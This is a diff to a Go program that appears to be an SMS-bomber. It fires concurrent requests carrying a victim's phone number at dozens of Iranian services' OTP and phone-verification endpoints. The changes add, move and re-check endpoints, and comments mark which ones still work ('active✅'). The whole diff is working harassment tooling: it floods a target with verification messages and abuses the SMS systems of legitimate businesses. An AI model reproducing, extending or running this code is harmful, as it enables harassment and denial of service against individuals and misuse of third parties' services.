@@ -150,6 +150,15 @@ func main() {
 		go sms("https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{
 			"phone": phone,
 		}, ch)    //active✅
+		go sms("https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
+			"phoneNumber": phone,
+		}, ch)    //active✅
+		go sms("https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
+			"username": phone,
+		}, ch)    //active✅
+		go sms("https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
+			"phone": phone,
+		}, ch)    //active✅
 		go sms("https://3tex.io/api/1/users/validation/mobile", map[string]interface{}{
 			"receptorPhone": phone,
 		}, ch)  //ofline site = error 504
@@ -161,6 +170,9 @@ func main() {
 		}, ch)   // just check
 		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
 			"cellphone": phone,
+		}, ch)   // just check
+		go sms("https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
+			"phone": phone,
 		}, ch)   // just check
 		go sms("https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", map[string]interface{}{
 			"phone": phone,
@@ -201,7 +213,6 @@ func main() {
 			"mobile": phone,
 		}, ch)    // add site
  /////////////////////////////////////// site aparat should definitely be added.
-/////////////////////////////////////// added snapp food 
 		go sms("https://account.bama.ir/api/otp/generate/v4", map[string]interface{}{
 			"username": phone,
 		}, ch)  // edit :4/22/2025
@@ -217,58 +228,57 @@ func main() {
 		go sms("https://api.bahramshop.ir/api/user/validate/username", map[string]interface{}{
 			"username": phone,
 		}, ch)  // error site: secure connection
-		go sms("https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
-			"phone": phone,
-		}, ch)    //active✅
- //delete site : not box phone number
 		go sms("https://api.bitpin.ir/v1/usr/sub_phone/", map[string]interface{}{
 			"phone=": phone,
 		}, ch)  //Password required
-//delete site from domain
 		go sms("https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // idon't know ???
-		go sms("https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
-			"phoneNumber": phone,
-		}, ch)    //active✅
-		go sms("https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
-			"username": phone,
-		}, ch)    //active✅
 		go sms("https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // edit :4/22/2025
 		go sms("https://app.itoll.ir/api/v1/auth/login", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // edit :4/22/2025
-  //delete site from domain
- //delete site from domain
 		go sms("https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
 			"contact": phone,
-		}, ch)
-		go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", map[string]interface{}{
+		}, ch) // just check
+		go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request", map[string]interface{}{
 			"UserName": phone,
-		}, ch)
-		go sms("https://www.sheypoor.com/auth", map[string]interface{}{
+		}, ch)  // edit :4/22/2025
+		go sms("https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{
 			"username": phone,
-		}, ch)
-		go sms("https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
-			"phone": phone,
-		}, ch)
-		go sms("https://a4baz.com/api/web/login", map[string]interface{}{
-			"cellphone": phone,
-		}, ch)
-		go sms("https://api.anargift.com/api/people/auth", map[string]interface{}{
-			"user": phone,
-		}, ch)
-		go sms("https://nobat.ir/api/public/patient/login/phone", map[string]interface{}{
+		}, ch)  // edit :4/22/2025
+		go sms("https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
 			"mobile": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
+		go sms("https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{
+			"mobile": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://api.nobat.ir/patient/login/phone", map[string]interface{}{
+			"mobile": phone,
+		}, ch)  // edit :4/22/2025
 		go sms("https://www.buskool.com/send_verification_code", map[string]interface{}{
 			"phone": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
 		go sms("https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
 			"'Parameters': {'ApplicationType': 'Web','ApplicationUniqueToken': None, 'ApplicationVersion': '1.0.0','MobileNumber': +": phone,
-		}, ch)
+		}, ch) //i don't know
+		go sms("https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/getLoginMethod", map[string]interface{}{
+			"MobileNumber": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
+			"MobileNumber": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://core.pishkhan24.ayantech.ir/webservices/core.svc/v1/LoginByOTP", map[string]interface{}{
+			"null, Username": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://core.pishkhan24.ayantech.ir/webservices/core.svc/v1/LoginByOTP", map[string]interface{}{
+			"Username": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://core.pishkhan24.ayantech.ir/webservices/core.svc/v1/LoginByOTP", map[string]interface{}{
+			"Username": phone,
+		}, ch)  // edit :4/22/2025
 		go sms("https://www.simkhanapi.ir/api/users/registerV2", map[string]interface{}{
 			"mobileNumber": phone,
 		}, ch)
